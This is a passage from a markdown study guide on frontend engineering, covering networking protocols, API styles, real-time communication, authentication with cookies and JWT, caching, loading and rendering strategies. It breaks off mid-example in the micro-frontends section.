---
id: 200
category: System Design
priority: high
tags: [performance, security, architecture, web-vitals, networking]
---

# Frontend Engineering Mastery: Complete Guide

> Master these concepts to become a top 1% frontend engineer. Each section includes detailed explanations and practical code examples.

---

## Table of Contents

1. [Networking & Protocols](#1-networking--protocols)
2. [API Communication Patterns](#2-api-communication-patterns)
3. [Real-Time Communication](#3-real-time-communication)
4. [Security & Authentication](#4-security--authentication)
5. [Performance & Content Delivery](#5-performance--content-delivery)
6. [Loading Strategies](#6-loading-strategies)
7. [Resource Hints](#7-resource-hints)
8. [Rendering Strategies](#8-rendering-strategies)
9. [Architecture](#9-architecture)
10. [Resilience Patterns](#10-resilience-patterns)
11. [Error Management](#11-error-management)
12. [Testing & Experimentation](#12-testing--experimentation)
13. [Observability](#13-observability)
14. [Security Vulnerabilities](#14-security-vulnerabilities)
15. [Core Web Vitals](#15-core-web-vitals)

---

## 1. Networking & Protocols

### HTTP/HTTPS

**What it is:** The foundation of web communication.

- **HTTP (HyperText Transfer Protocol)**: Unencrypted communication between browser and server
- **HTTPS (HTTP Secure)**: Encrypted version using SSL/TLS certificates

**Why it matters:** HTTPS protects user data from interception and is required for modern web features.

**Example:**
```javascript
// HTTP - Insecure (avoid in production)
http://example.com/api/users

// HTTPS - Secure (always use in production)
https://example.com/api/users

// Browser automatically redirects HTTP to HTTPS when configured
if (window.location.protocol !== 'https:') {
  window.location.href = window.location.href.replace('http:', 'https:');
}
```

**Key Differences:**
```
HTTP:  Data sent in plain text → Can be intercepted
HTTPS: Data encrypted with SSL/TLS → Secure transmission
```

---

### HTTP/2

**What it is:** Major revision of HTTP protocol with significant performance improvements.

**Key Features:**
- **Multiplexing**: Multiple requests over single connection
- **Binary format**: More efficient than text-based HTTP/1.1
- **Header compression**: Reduces overhead
- **Server push**: Server can send resources before client requests them

**Example:**
```javascript
// HTTP/1.1: Sequential requests (blocking)
fetch('/api/user');      // Wait for this...
fetch('/api/posts');     // Then this...
fetch('/api/comments');  // Then this...

// HTTP/2: Parallel requests (non-blocking)
Promise.all([
  fetch('/api/user'),
  fetch('/api/posts'),
  fetch('/api/comments')
]); // All sent simultaneously over one connection
```

**Benefits:**
- Faster page loads (30-50% improvement)
- Reduced latency
- Better resource utilization

---

### HTTP/3

**What it is:** Latest HTTP version built on QUIC protocol (UDP instead of TCP).

**Key Improvements:**
- **Faster connection establishment**: 0-RTT or 1-RTT handshake
- **No head-of-line blocking**: Packet loss doesn't block other streams
- **Better mobile performance**: Handles network switching seamlessly

**Example Scenario:**
```javascript
// User switches from WiFi to mobile data
// HTTP/2: Connection breaks, needs reconnection
// HTTP/3: Connection persists, seamless transition

// Browser handles this automatically
fetch('https://example.com/api/data'); // Works across network changes
```

**When to use:** High-traffic sites, mobile-first applications, real-time apps

---

## 2. API Communication Patterns

### REST (Representational State Transfer)

**What it is:** Architectural style using standard HTTP methods and resource-based URLs.

**Principles:**
- Stateless communication
- Resource-based URLs
- Standard HTTP methods (GET, POST, PUT, DELETE)
- JSON response format

**Complete Example:**
```javascript
// RESTful API endpoints for a blog
GET    /api/posts           // Get all posts
GET    /api/posts/123       // Get post #123
POST   /api/posts           // Create new post
PUT    /api/posts/123       // Update post #123
PATCH  /api/posts/123       // Partial update post #123
DELETE /api/posts/123       // Delete post #123

// Usage in React
const PostAPI = {
  getAll: async () => {
    const response = await fetch('/api/posts');
    return response.json();
  },
  
  getById: async (id) => {
    const response = await fetch(`/api/posts/${id}`);
    return response.json();
  },
  
  create: async (postData) => {
    const response = await fetch('/api/posts', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(postData)
    });
    return response.json();
  },
  
  update: async (id, postData) => {
    const response = await fetch(`/api/posts/${id}`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(postData)
    });
    return response.json();
  },
  
  delete: async (id) => {
    await fetch(`/api/posts/${id}`, { method: 'DELETE' });
  }
};
```

**Pros:** Simple, cacheable, widely supported
**Cons:** Over-fetching/under-fetching, multiple endpoints

---

### GraphQL

**What it is:** Query language for APIs that allows clients to request exactly the data they need.

**Key Features:**
- Single endpoint
- Precise data fetching
- Strong typing
- Real-time subscriptions

**Complete Example:**
```graphql
# Schema Definition
type User {
  id: ID!
  name: String!
  email: String!
  posts: [Post!]!
}

type Post {
  id: ID!
  title: String!
  content: String!
  author: User!
}

# Query - Fetch specific data
query GetUserWithPosts($userId: ID!) {
  user(id: $userId) {
    name
    email
    posts {
      title
      createdAt
    }
  }
}

# Mutation - Modify data
mutation CreatePost($input: CreatePostInput!) {
  createPost(input: $input) {
    id
    title
    author {
      name
    }
  }
}
```

**React Implementation:**
```javascript
import { useQuery, useMutation, gql } from '@apollo/client';

const GET_USER = gql`
  query GetUser($id: ID!) {
    user(id: $id) {
      name
      email
      posts {
        title
      }
    }
  }
`;

const CREATE_POST = gql`
  mutation CreatePost($title: String!, $content: String!) {
    createPost(input: { title: $title, content: $content }) {
      id
      title
    }
  }
`;

function UserProfile({ userId }) {
  const { data, loading, error } = useQuery(GET_USER, {
    variables: { id: userId }
  });
  
  const [createPost] = useMutation(CREATE_POST);
  
  if (loading) return <p>Loading...</p>;
  if (error) return <p>Error: {error.message}</p>;
  
  return (
    <div>
      <h1>{data.user.name}</h1>
      <p>{data.user.email}</p>
      <ul>
        {data.user.posts.map(post => (
          <li key={post.id}>{post.title}</li>
        ))}
      </ul>
      <button onClick={() => createPost({
        variables: { title: 'New Post', content: 'Content' }
      })}>
        Create Post
      </button>
    </div>
  );
}
```

**Pros:** No over-fetching, single request, flexible
**Cons:** Complex caching, harder to optimize

---

### gRPC (Google Remote Procedure Call)

**What it is:** High-performance RPC framework using Protocol Buffers.

**Use Cases:** Microservices communication, internal APIs

**Example:**
```protobuf
// service.proto
syntax = "proto3";

service UserService {
  rpc GetUser (UserRequest) returns (UserResponse);
  rpc CreateUser (CreateUserRequest) returns (UserResponse);
}

message UserRequest {
  string user_id = 1;
}

message CreateUserRequest {
  string name = 1;
  string email = 2;
}

message UserResponse {
  string id = 1;
  string name = 2;
  string email = 3;
}
```

**JavaScript Client:**
```javascript
const grpc = require('@grpc/grpc-js');
const protoLoader = require('@grpc/proto-loader');

const packageDefinition = protoLoader.loadSync('service.proto');
const userService = grpc.loadPackageDefinition(packageDefinition).UserService;

const client = new userService(
  'localhost:50051',
  grpc.credentials.createInsecure()
);

client.GetUser({ user_id: '123' }, (error, response) => {
  if (error) {
    console.error(error);
  } else {
    console.log(response);
  }
});
```

**Pros:** Fast, strongly typed, efficient binary format
**Cons:** Not browser-native, requires code generation

---

## 3. Real-Time Communication

### WebSockets

**What it is:** Full-duplex persistent connection for real-time bidirectional communication.

**Use Cases:** Chat apps, live gaming, collaborative editing

**Complete Example:**
```javascript
// WebSocket Service
class WebSocketService {
  constructor(url) {
    this.url = url;
    this.ws = null;
    this.reconnectAttempts = 0;
    this.maxReconnectAttempts = 5;
  }
  
  connect() {
    this.ws = new WebSocket(this.url);
    
    this.ws.onopen = () => {
      console.log('Connected');
      this.reconnectAttempts = 0;
    };
    
    this.ws.onmessage = (event) => {
      const data = JSON.parse(event.data);
      this.handleMessage(data);
    };
    
    this.ws.onerror = (error) => {
      console.error('WebSocket error:', error);
    };
    
    this.ws.onclose = () => {
      console.log('Disconnected');
      this.reconnect();
    };
  }
  
  sendMessage(type, payload) {
    if (this.ws.readyState === WebSocket.OPEN) {
      this.ws.send(JSON.stringify({ type, payload }));
    }
  }
  
  handleMessage(data) {
    switch (data.type) {
      case 'CHAT_MESSAGE':
        this.onChatMessage(data.payload);
        break;
      case 'USER_TYPING':
        this.onUserTyping(data.payload);
        break;
      default:
        console.log('Unknown message type:', data.type);
    }
  }
  
  reconnect() {
    if (this.reconnectAttempts < this.maxReconnectAttempts) {
      this.reconnectAttempts++;
      const delay = Math.pow(2, this.reconnectAttempts) * 1000;
      setTimeout(() => this.connect(), delay);
    }
  }
  
  disconnect() {
    this.ws.close();
  }
}

// Usage in React Chat Component
function ChatRoom({ roomId }) {
  const [messages, setMessages] = useState([]);
  const [wsService] = useState(() => new WebSocketService(`wss://chat.example.com/${roomId}`));
  
  useEffect(() => {
    wsService.onChatMessage = (message) => {
      setMessages(prev => [...prev, message]);
    };
    
    wsService.connect();
    
    return () => wsService.disconnect();
  }, [roomId]);
  
  const sendMessage = (text) => {
    wsService.sendMessage('CHAT_MESSAGE', { text, roomId });
  };
  
  return (
    <div>
      {messages.map(msg => (
        <div key={msg.id}>{msg.text}</div>
      ))}
      <input onKeyPress={(e) => {
        if (e.key === 'Enter') sendMessage(e.target.value);
      }} />
    </div>
  );
}
```

---

### SSE (Server-Sent Events)

**What it is:** One-way communication from server to client with automatic reconnection.

**Use Cases:** Live notifications, stock prices, news feeds

**Server Implementation (Node.js):**
```javascript
const express = require('express');
const app = express();

app.get('/api/notifications', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  
  // Send initial connection event
  res.write('retry: 3000\n\n');
  
  // Simulate sending notifications
  const interval = setInterval(() => {
    const notification = {
      id: Date.now(),
      message: `New notification at ${new Date().toLocaleTimeString()}`,
      timestamp: new Date().toISOString()
    };
    
    res.write(`data: ${JSON.stringify(notification)}\n\n`);
  }, 5000);
  
  req.on('close', () => {
    clearInterval(interval);
  });
});

app.listen(3000);
```

**Client Implementation:**
```javascript
class NotificationService {
  constructor(url) {
    this.url = url;
    this.eventSource = null;
  }
  
  connect(onNotification) {
    this.eventSource = new EventSource(this.url);
    
    this.eventSource.onmessage = (event) => {
      const notification = JSON.parse(event.data);
      onNotification(notification);
    };
    
    this.eventSource.onerror = (error) => {
      console.error('SSE Error:', error);
      this.eventSource.close();
    };
  }
  
  disconnect() {
    if (this.eventSource) {
      this.eventSource.close();
    }
  }
}

// Usage
const notificationService = new NotificationService('/api/notifications');

notificationService.connect((notification) => {
  showNotification(notification.message);
  updateBadgeCount();
});

// Cleanup
window.addEventListener('beforeunload', () => {
  notificationService.disconnect();
});
```

---

### Polling

**What it is:** Client repeatedly requests server for updates.

**Types:**
- **Short Polling**: Request at fixed intervals
- **Long Polling**: Server holds request until data available

**Short Polling Example:**
```javascript
function usePolling(url, interval = 5000) {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  
  useEffect(() => {
    const fetchData = async () => {
      try {
        const response = await fetch(url);
        const result = await response.json();
        setData(result);
      } catch (error) {
        console.error('Polling error:', error);
      } finally {
        setLoading(false);
      }
    };
    
    fetchData(); // Initial fetch
    const intervalId = setInterval(fetchData, interval);
    
    return () => clearInterval(intervalId);
  }, [url, interval]);
  
  return { data, loading };
}

// Usage
function LiveScoreboard() {
  const { data: scores, loading } = usePolling('/api/scores', 3000);
  
  if (loading) return <p>Loading...</p>;
  
  return (
    <div>
      {scores?.map(game => (
        <div key={game.id}>
          {game.team1}: {game.score1} - {game.team2}: {game.score2}
        </div>
      ))}
    </div>
  );
}
```

**Long Polling Example:**
```javascript
async function longPoll(url, timeout = 30000) {
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), timeout);
    
    const response = await fetch(url, {
      signal: controller.signal
    });
    
    clearTimeout(timeoutId);
    return await response.json();
  } catch (error) {
    if (error.name === 'AbortError') {
      // Timeout - retry
      return longPoll(url, timeout);
    }
    throw error;
  }
}

// Usage
async function watchForUpdates() {
  while (true) {
    const update = await longPoll('/api/updates');
    handleUpdate(update);
  }
}
```

---

## 4. Security & Authentication

### CORS (Cross-Origin Resource Sharing)

**What it is:** Browser security mechanism controlling cross-domain requests.

**Problem:** Browser blocks requests from `app.example.com` to `api.example.com` by default.

**Server Configuration (Express):**
```javascript
const cors = require('cors');

// Allow specific origin
app.use(cors({
  origin: 'https://app.example.com',
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true
}));

// Manual CORS headers
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', 'https://app.example.com');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.header('Access-Control-Allow-Credentials', 'true');
  
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200); // Preflight request
  }
  
  next();
});
```

**Preflight Request:**
```javascript
// Browser automatically sends OPTIONS request before actual request
OPTIONS /api/users HTTP/1.1
Origin: https://app.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization

// Server responds
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: POST
Access-Control-Allow-Headers: Content-Type, Authorization
```

---

### Cookies

**What it is:** Small data stored by browser, automatically sent with requests.

**Types:**
- **Session Cookies**: Deleted when browser closes
- **Persistent Cookies**: Have expiration date
- **HttpOnly**: Not accessible via JavaScript (XSS protection)
- **Secure**: Only sent over HTTPS
- **SameSite**: Controls cross-site sending

**Complete Example:**
```javascript
// Setting cookies (server-side)
res.cookie('sessionId', 'abc123', {
  httpOnly: true,      // Cannot access via document.cookie
  secure: true,        // HTTPS only
  sameSite: 'strict',  // Prevent CSRF
  maxAge: 24 * 60 * 60 * 1000, // 24 hours
  path: '/'
});

// Reading cookies (server-side)
const sessionId = req.cookies.sessionId;

// Deleting cookie
res.clearCookie('sessionId');

// Client-side (only non-HttpOnly cookies)
document.cookie = "theme=dark; max-age=86400; path=/";
```

**Authentication Flow:**
```javascript
// Login endpoint
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  
  // Verify credentials
  const user = await verifyUser(username, password);
  
  if (user) {
    // Create session
    const token = generateToken(user);
    
    res.cookie('auth_token', token, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
    });
    
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// Protected route middleware
function authenticate(req, res, next) {
  const token = req.cookies.auth_token;
  
  if (!token) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  
  try {
    const user = verifyToken(token);
    req.user = user;
    next();
  } catch (error) {
    res.status(401).json({ error: 'Invalid token' });
  }
}

app.get('/api/profile', authenticate, (req, res) => {
  res.json({ user: req.user });
});
```

---

### Tokens (JWT - JSON Web Tokens)

**What it is:** Self-contained authentication tokens with encoded user information.

**Structure:** `header.payload.signature`

**Complete JWT Implementation:**
```javascript
const jwt = require('jsonwebtoken');

const SECRET_KEY = process.env.JWT_SECRET;

// Generate token
function generateToken(user) {
  return jwt.sign(
    {
      userId: user.id,
      email: user.email,
      role: user.role
    },
    SECRET_KEY,
    { expiresIn: '7d' }
  );
}

// Verify token
function verifyToken(token) {
  return jwt.verify(token, SECRET_KEY);
}

// Authentication middleware
function authenticateToken(req, res, next) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1]; // Bearer TOKEN
  
  if (!token) {
    return res.status(401).json({ error: 'Access denied' });
  }
  
  try {
    const user = verifyToken(token);
    req.user = user;
    next();
  } catch (error) {
    res.status(403).json({ error: 'Invalid token' });
  }
}

// Usage in routes
app.post('/api/login', async (req, res) => {
  const user = await verifyCredentials(req.body);
  
  if (user) {
    const token = generateToken(user);
    res.json({ token });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

app.get('/api/profile', authenticateToken, (req, res) => {
  res.json({ user: req.user });
});
```

**Client-Side Usage:**
```javascript
// Store token
localStorage.setItem('token', token);

// Include in requests
const api = {
  async get(endpoint) {
    const token = localStorage.getItem('token');
    const response = await fetch(endpoint, {
      headers: {
        'Authorization': `Bearer ${token}`
      }
    });
    return response.json();
  },
  
  async post(endpoint, data) {
    const token = localStorage.getItem('token');
    const response = await fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${token}`
      },
      body: JSON.stringify(data)
    });
    return response.json();
  }
};

// Auto-refresh token
async function refreshToken() {
  const response = await fetch('/api/refresh-token', {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${localStorage.getItem('token')}`
    }
  });
  
  const { token } = await response.json();
  localStorage.setItem('token', token);
}

// Check token expiration
function isTokenExpired(token) {
  const payload = JSON.parse(atob(token.split('.')[1]));
  return payload.exp * 1000 < Date.now();
}
```

---

*(Continued in next part...)*

---

## 5. Performance & Content Delivery

### CDNs (Content Delivery Networks)

**What it is:** Distributed network of servers delivering content from locations closest to users.

**How it works:**
```
User in India → Mumbai CDN Edge Server (fast)
User in USA → New York CDN Edge Server (fast)
Instead of both hitting Origin Server in Europe (slow)
```

**Popular CDNs:** Cloudflare, AWS CloudFront, Akamai, Fastly

**Configuration Example:**
```javascript
// Next.js - Configure CDN for static assets
module.exports = {
  assetPrefix: 'https://cdn.example.com'
};

// HTML - Use CDN for libraries
<script src="https://cdn.jsdelivr.net/npm/react@18/umd/react.production.min.js"></script>
<link rel="stylesheet" href="https://cdn.example.com/styles.css">

// Image optimization with CDN
<img src="https://cdn.example.com/images/photo.jpg?width=800&quality=80">
```

**Benefits:**
- 50-70% faster load times
- Reduced server load
- DDoS protection
- Automatic SSL

---

### Edge Delivery

**What it is:** Processing content at CDN edge locations before reaching origin server.

**Use Cases:** A/B testing, personalization, geo-blocking, bot detection

**Cloudflare Workers Example:**
```javascript
// Edge function running on CDN
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);
  const country = request.cf.country;
  
  // Geo-specific content
  if (country === 'IN') {
    return fetch('https://origin.example.com/in/home');
  }
  
  // A/B Testing
  const variant = Math.random() > 0.5 ? 'A' : 'B';
  const response = await fetch(`https://origin.example.com/${variant}/home`);
  
  const modifiedResponse = new Response(response.body, response);
  modifiedResponse.headers.set('X-AB-Test', variant);
  
  return modifiedResponse;
}
```

---

### Browser Caching

**What it is:** Storing files locally in browser to avoid re-downloading.

**Cache Control Headers:**
```javascript
// Express - Set caching headers
app.use(express.static('public', {
  maxAge: '1y', // Cache for 1 year
  etag: true,
  lastModified: true
}));

// Different strategies for different file types
app.get('/*.js', (req, res, next) => {
  res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
  next();
});

app.get('/api/*', (req, res, next) => {
  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
  next();
});
```

**Cache Strategies:**

```javascript
// 1. Strong Caching (long-term)
Cache-Control: public, max-age=31536000, immutable
// Files never change (hashed filenames)

// 2. Validation Caching (check if changed)
Cache-Control: no-cache
ETag: "abc123"
// Browser sends If-None-Match, server responds 304 if unchanged

// 3. No Caching
Cache-Control: no-store
// Never cache (sensitive data)
```

**Service Worker Caching:**
```javascript
// sw.js - Cache-first strategy
self.addEventListener('fetch', event => {
  event.respondWith(
    caches.match(event.request).then(cachedResponse => {
      if (cachedResponse) {
        // Return cached version
        return cachedResponse;
      }
      
      // Fetch from network and cache
      return fetch(event.request).then(networkResponse => {
        const responseClone = networkResponse.clone();
        caches.open('v1').then(cache => {
          cache.put(event.request, responseClone);
        });
        return networkResponse;
      });
    })
  );
});
```

---

### Compression (gzip, Brotli)

**What it is:** Reducing file sizes before transmission.

**Comparison:**
```
Original:  100 KB
gzip:      30 KB  (70% reduction)
Brotli:    25 KB  (75% reduction, better than gzip)
```

**Server Configuration:**

```javascript
// Express with compression
const compression = require('compression');
app.use(compression());

// Nginx configuration
gzip on;
gzip_types text/plain text/css application/json application/javascript;
gzip_min_length 1000;

// Enable Brotli (better compression)
brotli on;
brotli_types text/plain text/css application/json application/javascript;
```

**Check Compression:**
```javascript
// Verify compression is working
curl -H "Accept-Encoding: gzip, br" -I https://example.com/app.js

// Response headers should include:
Content-Encoding: br  // or gzip
```

---

### Image & Asset Optimization

**What it is:** Reducing image/file sizes without visible quality loss.

**Modern Formats:**
```html
<!-- Use modern formats with fallback -->
<picture>
  <source srcset="image.avif" type="image/avif">
  <source srcset="image.webp" type="image/webp">
  <img src="image.jpg" alt="Optimized image" loading="lazy">
</picture>
```

**Responsive Images:**
```html
<!-- Serve different sizes based on viewport -->
<img
  srcset="
    image-400w.jpg 400w,
    image-800w.jpg 800w,
    image-1200w.jpg 1200w
  "
  sizes="(max-width: 600px) 400px, (max-width: 1200px) 800px, 1200px"
  src="image-800w.jpg"
  alt="Responsive image"
>
```

**Image Optimization Tools:**
```javascript
// Sharp (Node.js image processing)
const sharp = require('sharp');

async function optimizeImage(inputPath, outputPath) {
  await sharp(inputPath)
    .resize(800, 600, { fit: 'contain' })
    .webp({ quality: 80 })
    .toFile(outputPath);
}

// Next.js Image component (automatic optimization)
import Image from 'next/image';

<Image
  src="/photo.jpg"
  alt="Photo"
  width={800}
  height={600}
  priority // For above-the-fold images
/>
```

**Best Practices:**
- Use WebP/AVIF formats
- Compress to 80% quality
- Resize to display dimensions
- Lazy load below-fold images
- Use SVG for icons/logos

---

## 6. Loading Strategies

### Lazy Loading

**What it is:** Loading content only when needed (on-demand).

**Image Lazy Loading:**
```html
<!-- Native lazy loading -->
<img src="large-image.jpg" loading="lazy" alt="Lazy loaded">

<!-- With blur placeholder -->
<img
  src="thumbnail.jpg"
  data-src="full-image.jpg"
  class="lazy-load"
  alt="Progressive image"
>

<style>
.lazy-load {
  filter: blur(10px);
  transition: filter 0.3s;
}
.lazy-load.loaded {
  filter: blur(0);
}
</style>

<script>
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      const img = entry.target;
      img.src = img.dataset.src;
      img.classList.add('loaded');
      observer.unobserve(img);
    }
  });
});

document.querySelectorAll('.lazy-load').forEach(img => {
  observer.observe(img);
});
</script>
```

**Component Lazy Loading (React):**
```javascript
import { lazy, Suspense } from 'react';

// Lazy load components
const Dashboard = lazy(() => import('./Dashboard'));
const Settings = lazy(() => import('./Settings'));
const Analytics = lazy(() => import('./Analytics'));

function App() {
  const [page, setPage] = useState('dashboard');
  
  return (
    <Suspense fallback={<LoadingSpinner />}>
      {page === 'dashboard' && <Dashboard />}
      {page === 'settings' && <Settings />}
      {page === 'analytics' && <Analytics />}
    </Suspense>
  );
}

// Route-based lazy loading (React Router)
const Routes = () => (
  <Routes>
    <Route path="/" element={<Home />} />
    <Route
      path="/dashboard"
      element={
        <Suspense fallback={<Loading />}>
          <Dashboard />
        </Suspense>
      }
    />
  </Routes>
);
```

---

### Code Splitting

**What it is:** Breaking code into smaller chunks loaded on demand.

**Webpack Configuration:**
```javascript
// webpack.config.js
module.exports = {
  optimization: {
    splitChunks: {
      chunks: 'all',
      maxInitialRequests: 5,
      cacheGroups: {
        vendor: {
          test: /[\\/]node_modules[\\/]/,
          name: 'vendors',
          chunks: 'all'
        }
      }
    }
  }
};
```

**Dynamic Imports:**
```javascript
// Load module on demand
async function loadChartLibrary() {
  const Chart = await import('chart.js');
  return Chart;
}

// Conditional loading
if (userRole === 'admin') {
  const AdminPanel = await import('./AdminPanel');
  renderAdminPanel(AdminPanel);
}

// Prefetch on hover
button.addEventListener('mouseenter', () => {
  import('./HeavyComponent'); // Preload but don't execute
});
```

**Bundle Analysis:**
```bash
# Analyze bundle size
npm install webpack-bundle-analyzer

# Add to webpack config
const BundleAnalyzerPlugin = require('webpack-bundle-analyzer').BundleAnalyzerPlugin;

plugins: [
  new BundleAnalyzerPlugin()
]
```

---

### Tree Shaking

**What it is:** Removing unused code from final bundle.

**Requirements:**
- ES6 modules (import/export)
- Side-effect-free code

**Example:**
```javascript
// Bad - Imports entire library
import _ from 'lodash';
_.debounce(fn, 300); // Uses only debounce

// Good - Import only what you need
import { debounce } from 'lodash-es';
debounce(fn, 300);

// Even better - Use smaller alternative
import debounce from 'lodash.debounce';
```

**Package.json Side Effects:**
```json
{
  "name": "my-library",
  "sideEffects": false,
  "exports": {
    ".": "./src/index.js",
    "./utils": "./src/utils/index.js"
  }
}
```

**Verify Tree Shaking:**
```javascript
// This code will be removed if unused
export function unusedFunction() {
  console.log('This will be tree-shaken');
}

// This code stays if used
export function usedFunction() {
  console.log('This stays');
}
```

---

## 7. Resource Hints

### Prefetch

**What it is:** Load resources likely needed later (low priority, idle time).

```html
<!-- Prefetch next page -->
<link rel="prefetch" href="/next-page.js" as="script">

<!-- Prefetch on link hover -->
<a href="/about" onmouseover="prefetchPage(this.href)">About</a>

<script>
function prefetchPage(url) {
  const link = document.createElement('link');
  link.rel = 'prefetch';
  link.href = url;
  document.head.appendChild(link);
}
</script>
```

**React Router Prefetch:**
```javascript
import { Link, useNavigate } from 'react-router-dom';

function Navigation() {
  const navigate = useNavigate();
  
  const prefetchRoute = (path) => {
    import(`../pages/${path}`);
  };
  
  return (
    <nav>
      <Link 
        to="/dashboard"
        onMouseEnter={() => prefetchRoute('Dashboard')}
      >
        Dashboard
      </Link>
    </nav>
  );
}
```

---

### Preload

**What it is:** Load critical resources immediately (high priority).

```html
<!-- Preload critical font -->
<link rel="preload" href="/fonts/roboto.woff2" as="font" crossorigin>

<!-- Preload hero image -->
<link rel="preload" href="/hero.jpg" as="image">

<!-- Preload critical CSS -->
<link rel="preload" href="/critical.css" as="style">

<!-- Preload video -->
<link rel="preload" href="/video.mp4" as="video">
```

**When to use:**
- Above-the-fold images
- Critical fonts
- Hero videos
- Essential CSS/JS

---

### Preconnect

**What it is:** Establish connection to server early (DNS + TCP + TLS).

```html
<!-- Preconnect to API server -->
<link rel="preconnect" href="https://api.example.com">

<!-- Preconnect to CDN -->
<link rel="preconnect" href="https://cdn.example.com" crossorigin>

<!-- Preconnect to analytics -->
<link rel="preconnect" href="https://www.google-analytics.com">
```

**Benefits:** Saves 100-300ms per connection

---

### dns-prefetch

**What it is:** Resolve domain names early (DNS lookup only).

```html
<!-- DNS prefetch for third-party services -->
<link rel="dns-prefetch" href="//fonts.googleapis.com">
<link rel="dns-prefetch" href="//www.google-analytics.com">
<link rel="dns-prefetch" href="//cdn.example.com">
```

**Comparison:**
```
dns-prefetch:  DNS lookup only (~20-120ms saved)
preconnect:    DNS + TCP + TLS (~100-300ms saved)
preload:       Full resource download
```

---

## 8. Rendering Strategies

### CSR (Client-Side Rendering)

**What it is:** Browser downloads JavaScript and builds the page.

**Flow:**
```
1. Download HTML (minimal)
2. Download JavaScript bundle
3. Execute JavaScript
4. Fetch data from API
5. Render page
```

**Example (React SPA):**
```javascript
// index.html - Minimal HTML
<!DOCTYPE html>
<html>
<body>
  <div id="root"></div>
  <script src="/bundle.js"></script>
</body>
</html>

// App.js - Everything rendered by JavaScript
function App() {
  const [users, setUsers] = useState([]);
  
  useEffect(() => {
    fetch('/api/users')
      .then(res => res.json())
      .then(setUsers);
  }, []);
  
  return (
    <div>
      {users.map(user => <UserCard key={user.id} user={user} />)}
    </div>
  );
}
```

**Pros:** Fast navigation, rich interactions
**Cons:** Slow initial load, poor SEO, blank screen during load

---

### SSR (Server-Side Rendering)

**What it is:** Server generates full HTML before sending to browser.

**Flow:**
```
1. Request page
2. Server fetches data
3. Server renders HTML
4. Send complete HTML to browser
5. Hydrate with JavaScript
```

**Next.js Example:**
```javascript
// pages/users.js
export async function getServerSideProps() {
  const res = await fetch('https://api.example.com/users');
  const users = await res.json();
  
  return {
    props: { users }
  };
}

function UsersPage({ users }) {
  return (
    <div>
      {users.map(user => (
        <div key={user.id}>{user.name}</div>
      ))}
    </div>
  );
}
```

**Pros:** Fast first paint, good SEO, social media previews
**Cons:** Slower TTFB, server load, complex setup

---

### SSG (Static Site Generation)

**What it is:** Pre-build all pages at build time.

**Flow:**
```
1. Build time: Generate all HTML files
2. Deploy static files to CDN
3. User requests page → Serve pre-built HTML
```

**Next.js Example:**
```javascript
// pages/blog/[slug].js
export async function getStaticPaths() {
  const posts = await fetchAllPosts();
  
  return {
    paths: posts.map(post => ({
      params: { slug: post.slug }
    })),
    fallback: false
  };
}

export async function getStaticProps({ params }) {
  const post = await fetchPost(params.slug);
  
  return {
    props: { post }
  };
}

function BlogPost({ post }) {
  return <article>{post.content}</article>;
}
```

**Pros:** Fastest performance, cheap hosting, great SEO
**Cons:** Not for dynamic content, rebuild needed for updates

---

### ISR (Incremental Static Regeneration)

**What it is:** Update static pages after deployment without full rebuild.

**Next.js Example:**
```javascript
// pages/products/[id].js
export async function getStaticPaths() {
  return {
    paths: [{ params: { id: '1' } }, { params: { id: '2' } }],
    fallback: 'blocking' // Show loading for new pages
  };
}

export async function getStaticProps({ params }) {
  const product = await fetchProduct(params.id);
  
  return {
    props: { product },
    revalidate: 60 // Rebuild every 60 seconds
  };
}

function ProductPage({ product }) {
  return <div>{product.name}</div>;
}
```

**Flow:**
```
1. First request: Generate page, cache it
2. Subsequent requests: Serve cached page
3. After 60s: Next request triggers rebuild in background
4. New requests get updated page
```

**Pros:** Static speed with dynamic updates
**Cons:** Complex caching logic, stale data possible

---

## 9. Architecture

### Micro-frontends

**What it is:** Breaking large application into independent, deployable pieces.

**Architecture:**
```
Main App (Shell)
├── Header Team (independent deployment)
├── Product Team (independent deployment)
├── Cart Team (independent deployment)
└── Checkout Team (independent deployment)
```

**Implementation (Module Federation):**
```javascript
// Host App (webpack.config.js)
const { ModuleFederationPlugin } = require('webpack').container;

module.exports = {
  plugins: [
    new ModuleFederationPlugin({
      name: 'host',
      remotes: {
        header: 'header@http://localhost:3001/remoteEntry.js',
        products: 'products@http://localhost:3002/remoteEntry.js',
        cart: 'cart@http://localhost:3003/remoteEntry.js'
      }
    })
  ]
};

// Remote App (header team)
module.exports = {
  plugins: [
    new ModuleFederationPlugin({
      name: 'header',
      filename: 'remoteEntry.js',
      exposes: {
        './Header': './src/Header'
      }
    })
  ]
};
```

**Usage:**
```javascript
// Dynamically load micro-frontend
const Header = React.lazy(() => import('header/Header'));

function App() {
  return (
